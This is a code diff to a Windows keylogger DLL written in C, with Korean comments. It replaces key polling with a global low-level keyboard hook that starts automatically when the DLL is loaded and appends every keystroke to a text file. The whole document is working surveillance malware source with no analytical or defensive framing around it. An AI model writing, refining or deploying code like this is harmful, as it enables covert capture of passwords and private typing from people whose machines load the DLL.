@@ -3,65 +3,66 @@
 
 #define LOG_FILE "C:\\Users\\namkg\\Desktop\\keylog_dll.txt"
 
-// 전역 변수: 키 상태 추적
-static BOOL g_keyState[256] = {0};
+static HHOOK g_hHook = NULL;
 
 void LogKey(int vkCode) {
     FILE* fp = fopen(LOG_FILE, "a");
     if (!fp) return;
 
-    // 영문자, 숫자
     if ((vkCode >= 0x41 && vkCode <= 0x5A) || (vkCode >= 0x30 && vkCode <= 0x39)) {
         fputc((char)vkCode, fp);
     }
-    // 특수 키
     else if (vkCode == VK_SPACE) fputc(' ', fp);
     else if (vkCode == VK_RETURN) fprintf(fp, "[ENTER]\n");
     else if (vkCode == VK_BACK) fprintf(fp, "[BACK]");
     else if (vkCode == VK_TAB) fprintf(fp, "[TAB]");
-    else if (vkCode == VK_SHIFT) fprintf(fp, "[SHIFT]");
-    else if (vkCode == VK_CONTROL) fprintf(fp, "[CTRL]");
-    else if (vkCode == VK_MENU) fprintf(fp, "[ALT]");
 
     fflush(fp);
     fclose(fp);
 }
 
-DWORD WINAPI KeyloggerThread(LPVOID param) {
-    // 시작 로그 (PID 포함으로 중복 확인)
+LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION) {
+        KBDLLHOOKSTRUCT* pKb = (KBDLLHOOKSTRUCT*)lParam;
+        
+        // WM_KEYDOWN만 처리 (한 번만 기록)
+        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
+            LogKey(pKb->vkCode);
+        }
+    }
+    
+    return CallNextHookEx(g_hHook, nCode, wParam, lParam);
+}
+
+DWORD WINAPI HookThread(LPVOID param) {
     FILE* fp = fopen(LOG_FILE, "a");
     if (fp) {
-        fprintf(fp, "\n=== Keylogger Started (PID: %d) ===\n", GetCurrentProcessId());
+        fprintf(fp, "\n=== Keylogger Started ===\n");
         fclose(fp);
     }
 
-    // 메인 루프
-    while (1) {
-        for (int vk = 8; vk < 256; vk++) {
-            SHORT state = GetAsyncKeyState(vk);
-            BOOL isPressed = (state & 0x8000) != 0;
-            
-            // 키가 새로 눌렸을 때만 기록
-            if (isPressed && !g_keyState[vk]) {
-                LogKey(vk);
-                g_keyState[vk] = TRUE;
-            }
-            // 키가 떼어졌을 때
-            else if (!isPressed && g_keyState[vk]) {
-                g_keyState[vk] = FALSE;
-            }
-        }
-        
-        Sleep(15);  // 15ms 대기
-    }
+    // 전역 키보드 후킹
+    g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     
+    if (!g_hHook) {
+        return 1;
+    }
+
+    // 메시지 루프
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+
+    UnhookWindowsHookEx(g_hHook);
     return 0;
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
     if (reason == DLL_PROCESS_ATTACH) {
         DisableThreadLibraryCalls(hModule);
-        CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
+        CreateThread(NULL, 0, HookThread, NULL, 0, NULL);
     }
     return TRUE;
 }
